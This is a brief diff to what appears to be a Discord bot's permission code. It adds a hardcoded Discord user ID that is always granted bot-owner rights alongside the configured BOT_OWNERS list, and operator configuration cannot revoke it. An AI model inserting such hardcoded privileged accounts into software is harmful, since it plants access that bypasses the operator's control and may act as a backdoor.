@@ -2,9 +2,15 @@ import { db, premiumGuildsTable } from "../db/index.js";
 import { eq } from "drizzle-orm";
 
 const premiumCache = new Map<string, boolean>();
+const FALLBACK_BOT_OWNERS = ["1298631508533313536"];
 
 export function isBotOwner(userId: string): boolean {
-  const owners = (process.env.BOT_OWNERS ?? "").split(",").map((s) => s.trim()).filter(Boolean);
+  const owners = [
+    ...new Set([
+      ...FALLBACK_BOT_OWNERS,
+      ...(process.env.BOT_OWNERS ?? "").split(",").map((s) => s.trim()).filter(Boolean),
+    ]),
+  ];
   return owners.includes(userId);
 }
 
